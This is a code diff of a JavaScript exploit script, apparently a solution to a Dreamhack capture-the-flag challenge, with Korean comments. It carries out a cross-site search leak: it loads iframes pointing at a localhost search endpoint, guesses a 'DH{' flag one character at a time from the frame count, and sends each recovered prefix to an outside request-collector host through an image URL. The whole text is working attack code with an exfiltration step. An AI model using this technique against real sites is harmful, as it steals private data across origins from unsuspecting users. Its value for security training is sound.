@@ -4,6 +4,7 @@
     async function search(query) {
         return new Promise((resolve) => {
             const iframe = document.createElement("iframe");
+            // 내부망의 IP를 사용
             iframe.src = "http://127.0.0.1:8000/search?query=" + query;
             document.body.appendChild(iframe);
             let removed = false;
@@ -19,16 +20,16 @@
             iframe.onload = () => {
                 try {
                     let result = iframe.contentWindow.frames.length;
-                    removeIframe();
+                    // removeIframe();
                     resolve(result > 0);
                 } catch (e) {
-                    removeIframe();
+                    // removeIframe();
                     resolve(false);
                 }
             };
 
             setTimeout(() => {
-                removeIframe();
+                // removeIframe();
                 resolve(false);
             }, 1000);
         });
@@ -39,7 +40,9 @@
         let secret = "DH{";
 
         while (!secret.includes("}")) {
-            let promises = chars.split("").map(c => search(secret + c).then(result => ({ char: c, success: result })));
+            let promises = chars.split("").map(c => 
+                search(secret + c).then(result => ({ char: c, success: result }))
+            );
             let results = await Promise.all(promises);
 
             let found = false;
@@ -48,6 +51,7 @@
                 if (rslt.success) {
                     secret += rslt.char;
                     found = true;
+                    // 템플릿 리터럴 문법 수정
                     img.src = `https://oozaipv.request.dreamhack.games/${secret}`;
                     break;
                 }
